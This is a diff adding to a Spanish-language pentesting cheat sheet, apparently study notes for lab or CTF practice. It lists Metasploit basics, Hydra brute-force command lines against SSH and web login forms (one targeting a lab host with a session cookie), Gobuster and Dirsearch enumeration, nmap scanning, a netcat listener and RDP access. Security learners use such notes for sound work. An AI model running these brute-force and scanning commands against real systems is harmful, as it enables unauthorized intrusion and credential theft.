@@ -68,6 +68,14 @@ Fases del hacking:
 
 Basic Commands:
 
+cd
+mv
+cp
+mkdir
+rmdir
+cat
+nano
+
 - Nmap [Escaneo de puertos]
 
 sudo nmap -A -T4 -sC -sV -p- <RHOST> # Escanea Sistema Operativo y Servicios, Modo Agresivo, Escanea con una lista default de scripts pertenecienetes a nmap, Detecta servicios y versiones y escanea todos los puertos
@@ -101,3 +109,40 @@ powershell -c "Invoke-WebRequest -Uri 'http://[IP]:[PUERTO]/recurso' -OutFile 'C
 - Netcat [Poner x puerto en escucha]
 
 nc -nlvp <Port>
+
+- Metasploit
+Escribir en la consola msfconsole para empezar a usar metasploit
+
+locate (para saber la ruta de un sploit por ejemplo)
+
+show -- mostrar, ver...
+search -- busca, filtra...
+
+auxuliary no es un comando, es una categoria de metasploit que escanea, saca informacion, etc. LOS AUXILIARY NO EXPLOTAN NADA, SIMPLEMENTE ESCANEA.
+
+set -- seleccion, elige, se trabaja... (version antigua)
+use -- "" (version nueva)
+run -- lanza exploit, auxiliary...
+
+- Hydra
+
+-L archivo de usuarios
+-l usuario
+-P archivo de contraseñas
+
+hydra -L users.txt -P pass.txt IP ssh (ssh indica el final)
+hydra -L [user diccionario] -P [password diccionario] [ip] [protocolo] 
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt [IP] http-post-form "[URL]:[TOKEN-URL]:Invalid Username" 
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 'http-get-form://10.10.36.145/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=17mm5k1jmmkcnes87ttmi63603; security=low; security=low:F=Username and/or password incorrect'
+
+- Gobuster
+
+gobuster dir --url http://[IP or URL] --wordlist /usr/share/wordlists/dirb/big.txt
+
+- Dirsearch
+
+dirsearch -u http://[IP or URL]/ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt,html -f
+
+- RDP
+
+xfreerdp /u:[USER] /p:[PASSWORD] /v:[IP] /cert-ignore -- Para conectarse por RDP a un equipo
